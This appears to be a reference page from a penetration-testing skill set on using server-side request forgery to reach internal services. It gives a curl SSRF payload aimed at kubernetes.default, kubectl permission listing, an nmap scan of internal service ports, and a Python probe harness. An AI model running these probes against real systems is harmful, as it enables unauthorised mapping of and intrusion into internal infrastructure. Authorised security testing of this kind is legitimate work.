# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`ssrf-internal-service-pivot`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS 'https://target.example/report?source=http://kubernetes.default/version'` | Request an internal version path through the fetch to identify a trust-by-network service | Cross-platform |
| `kubectl` | `kubectl auth can-i --list` | If a service-account token is reachable, enumerate what the pod identity can do before claiming impact | Linux, macOS, Windows |
| `nmap` | `nmap -sT -Pn -p 2375,6379,9200,8500,10250 <internal-host>` | From an authorised foothold, map which internal service ports answer to scope the pivot | Linux, macOS, Windows |

## Minimal Script Shape

An internal-identification harness: it fetches an internal version path through the endpoint and an external control, then reports whether service-identifying markers appear only on the internal path.

```python
import urllib.parse
import urllib.request

BASE = "https://target.example/report"

def probe(source):
    url = BASE + "?" + urllib.parse.urlencode({"source": source})
    try:
        with urllib.request.urlopen(url, timeout=10) as r:
            return r.status, r.read(512).decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, ""

control = probe("https://example.org/")
internal = probe("http://kubernetes.default/version")
print({"external_control": control[0], "internal_status": internal[0],
       "service_identified": "gitVersion" in internal[1] or "major" in internal[1]})
```
